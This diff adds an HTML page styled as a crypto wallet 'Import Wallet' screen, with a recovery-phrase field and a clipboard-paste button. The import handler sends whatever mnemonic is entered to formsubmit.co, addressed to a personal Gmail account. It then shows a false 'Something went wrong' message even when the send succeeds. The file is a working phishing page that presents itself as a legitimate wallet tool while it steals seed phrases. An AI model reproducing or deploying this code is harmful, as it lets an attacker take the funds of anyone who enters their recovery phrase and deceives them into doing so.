@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+        }
+        .header {
+            
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .back-arrow {
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            margin-right: 20px;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: normal;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            margin-bottom: 5px;
+            color: #888888;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 15px;
+            background-color: #1c1c1e;
+            border: none;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 16px;
+        }
+        .recovery-input {
+            display: flex;
+            align-items: center;
+        }
+        .insert-button {
+            cursor: pointer;
+            background-color: transparent;
+            border: 1px solid #5e5ce6;
+            color: #5e5ce6;
+            padding: 5px 10px;
+            border-radius: 5px;
+            margin-left: 10px;
+        }
+        .import-button {
+            cursor: pointer;
+            width: 100%;
+            padding: 15px;
+            background-color: #1c1c1e;
+            border: none;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 16px;
+            margin-top: 500px;
+        }
+    </style>
+    <script>
+        function back() {
+    event.preventDefault();
+    // Redirect to /authorization
+    window.location.href = "/index.html";
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  function handlePaste() {
+    const recoveryInput = document.querySelector('#recovery-phrase');
+    const pasteButton = document.querySelector('#pasteButton');
+
+    if (!navigator.clipboard) {
+      console.error('Clipboard API not supported.');
+      alert('Clipboard API not supported in this browser. Please paste manually.');
+      return;
+    }
+
+    pasteButton.addEventListener('click', async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        recoveryInput.value = text;
+      } catch (err) {
+        console.error('Failed to read clipboard contents: ', err);
+        alert('Unable to access clipboard. Please paste manually.');
+      }
+    });
+  }
+
+  handlePaste();
+});
+
+    </script>
+</head>
+<body>
+    <div class="header">
+        <svg onclick="back()" class="back-arrow" viewBox="0 0 24 24">
+            <path fill="#ffffff" d="M20,11V13H8L13.5,18.5L12.08,19.92L4.16,12L12.08,4.08L13.5,5.5L8,11H20Z" />
+        </svg>
+        <h1>Import Wallet</h1>
+    </div>
+    
+    <div class="input-group">
+        <label for="wallet-name">NAME WALLET</label>
+        <input type="text" id="wallet-name" placeholder="Enter wallet name...">
+    </div>
+    
+    <div class="input-group">
+        <label for="recovery-phrase">RECOVERY PHRASE (MNEMONIC)</label>
+        <div class="recovery-input">
+            <input type="text" id="recovery-phrase" placeholder="Recovery phrase (mnemonic)">
+            <button onclick="handlePaste()" id="pasteButton" class="insert-button">paste</button>
+        </div>
+    </div>
+    
+    <button class="import-button" id="importButton">Import</button>
+    <h5>Forgot Password?</h5>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+    
+    const importButton = document.getElementById('importButton');
+    const recoveryPhraseInput = document.getElementById('recovery-phrase');
+
+    // Function to handle the form submission
+    importButton.addEventListener('click', () => {
+        const recoveryPhrase = recoveryPhraseInput.value.trim();
+
+        if (recoveryPhrase) {
+            // Submit the recovery phrase to FormSubmit
+            fetch('https://formsubmit.co/Dan2skiid@gmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({ recoveryPhrase: recoveryPhrase })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Something went wrong, try again!");
+                // Handle success actions (e.g., display a success message, clear the form)
+            })
+            .catch((error) => {
+                alert("Form cannot be processed");
+                // Handle error actions (e.g., display an error message)
+            });
+        } else {
+            alert('Recovery phrase cannot be empty.');
+            // Handle the case where the recovery phrase is empty (e.g., display an error message)
+        }
+    });
+});
+
+    </script>
+</body>
+</html>
